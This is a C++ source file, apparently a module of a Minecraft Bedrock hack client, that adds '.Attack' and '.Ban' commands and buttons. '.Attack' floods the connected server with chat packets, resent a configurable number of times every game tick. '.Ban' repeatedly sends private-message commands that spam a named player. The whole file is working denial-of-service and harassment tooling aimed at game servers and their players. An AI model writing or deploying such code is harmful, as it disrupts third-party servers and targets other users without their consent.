#include "Server.h"
#include "MCPE/GameData.h"
#include "Android.h"
#include "HackSDK.h"

Server::Server()
{
	addConfig(&sendTimes, "sendTimes");
	addConfig(&dosTimes, "dosTimes");

	ModuleType = "Other";

	UIType = 1;

	std::stringstream s;
	for (int i = 0; i != 8000; i = i + 1) {
		s << "";
	}
	attackMessage = s.str();

	std::stringstream s1;
	for (int i = 0; i != 1000; i = i + 1) {
		s1 << "";
	}
	banMessage = s1.str();
}

const char* Server::GetName()
{
	return "Server";
}

void Server::OnCmd(std::vector<std::string>* cmd)
{
	if ((*cmd)[0] == ".Ban") {
		if (cmd->size() > 1) {
			if ((*cmd)[1] == "config") {
				if (cmd->size() > 2) {
					moduleManager->executedCMD = true;
					sendTimes = atoi((*cmd)[2].c_str());
				}
			}
			else {
				moduleManager->executedCMD = true;
				std::string pName = (*cmd)[1];
				ban(pName);
			}
		}
	}
	else if ((*cmd)[0] == ".UnBan") {
		if (cmd->size() > 1) {
			moduleManager->executedCMD = true;
			std::string pName = (*cmd)[1];
			unBan(pName);
		}
	}
	else if ((*cmd)[0] == ".Attack") {
		if (cmd->size() > 1) {
			if ((*cmd)[1] == "true") {
				moduleManager->executedCMD = true;
				startAttack();
			}
			else if ((*cmd)[1] == "false") {
				moduleManager->executedCMD = true;
				stopAttack();
			}
			else if ((*cmd)[1] == "config") {
				if (cmd->size() > 2) {
					moduleManager->executedCMD = true;
					dosTimes = atoi((*cmd)[2].c_str());
				}
			}
		}
	}
}


void Server::initViews() {

	

	Android::TextView* Server_attack = mAndroid->newTextView();
	UIUtils::updateTextViewData(Server_attack, "Attack", "#FF0000", 19);
	Server_attack->setOnClickListener([=](Android::View*) {
		if (attack == nullptr) {
			mAndroid->Toast("开始攻击服务器");
			startAttack();
		}
		else {
			mAndroid->Toast("停止攻击服务器");
			stopAttack();
		}
	});


	Android::EditText* Server_banName = mAndroid->newEditText();
	UIUtils::updateEditTextData(Server_banName, "PlayerName");

	Android::EditText* Server_int = mAndroid->newEditText();
	UIUtils::updateEditTextData(Server_int, " ");

	Android::TextView* Server_ban = mAndroid->newTextView();
	UIUtils::updateTextViewData(Server_ban, "Ban", "#FF0000", 19);
	Server_ban->setOnClickListener([=](Android::View*) {
		if (Server_banName->text == "") {
			return;
		}
		mAndroid->Toast("添加Ban名单成功");
		ban(Server_banName->text);
	});

	Android::TextView* Server_unBan = mAndroid->newTextView();
	UIUtils::updateTextViewData(Server_unBan, "UnBan", "#FF0000", 19);
	Server_unBan->setOnClickListener([=](Android::View*) {
		if (Server_banName->text == "") {
			return;
		}
		mAndroid->Toast("移除Ban名单成功");
		unBan(Server_banName->text);
	});


	Android::TextView* Server_attackConfig = mAndroid->newTextView();
	UIUtils::updateTextViewData(Server_attackConfig, "AttackConfig", "#FF0000", 19);
	Server_attackConfig->setOnClickListener([=](Android::View*) {
		if (Server_int->text == "") {
			return;
		}
		mAndroid->Toast("设置成功");
		sendTimes = UIUtils::et_getInt(Server_int);
	});

	Android::TextView* Server_banConfig = mAndroid->newTextView();
	UIUtils::updateTextViewData(Server_banConfig, "BanConfig", "#FF0000", 19);
	Server_banConfig->setOnClickListener([=](Android::View*) {
		if (Server_int->text == "") {
			return;
		}
		mAndroid->Toast("设置成功");
		dosTimes = UIUtils::et_getInt(Server_int);
	});


	
	SecondWindowList.push_back(Server_attack);
	SecondWindowList.push_back(Server_ban);
	SecondWindowList.push_back(Server_unBan);
	SecondWindowList.push_back(Server_banName);
	SecondWindowList.push_back(Server_int);
	SecondWindowList.push_back(Server_attackConfig);
	SecondWindowList.push_back(Server_banConfig);
}

void Server::OnTick(Actor* act)
{
	if (act != mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer())return;

	LocalPlayer* lp = mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer();
	if (attack) {
		for (int i = 0; i < dosTimes; i = i + 1) {
			HackSDK::sendBinaryPacket(*attack);
			
		}
	}


	for (auto it = BanList.begin(); it != BanList.end(); ++it) {
		for (int i = 0; i < sendTimes; i = i + 1) {
			HackSDK::sendBinaryPacket(*(it->second));
		}
	}
	BanList_mtx.unlock();
}

void Server::OnNewGame(std::string const& serverIP)
{
	BanList_mtx.lock();
	for (auto it = BanList.begin(); it != BanList.end(); it ++) {
		delete it->second;
	}
	BanList.clear();
	BanList_mtx.unlock();
}


void Server::startAttack(void)
{
	if (mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer()) {
		attack = new BinaryPacket(0);
		*attack = Text::createChat(mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer()->getName(), attackMessage, "1234567", "666").write();
	}
	else {
		attack = new BinaryPacket(0);
		*attack = Text::createChat("FBClient", attackMessage, "1234567", "666").write();
	}
}

void Server::stopAttack(void)
{
	delete attack;
	attack = nullptr;
}


void Server::ban(std::string const& name)
{
	std::stringstream cmd;
	cmd << "/msg " << name << " " << banMessage;
	BinaryPacket* packet = new BinaryPacket(0);
	*packet = CommandRequest({ 0,0 }, cmd.str(), CommandOrigin::CommandOriginPlayer, 0, false, false).write();
	BanList_mtx.lock();
	BanList.insert(std::pair<std::string, BinaryPacket*>(name, packet));
	BanList_mtx.unlock();
}

void Server::unBan(std::string const& name)
{
	BanList_mtx.lock();
	delete BanList[name];
	BanList.erase(name);
	BanList_mtx.unlock();
}




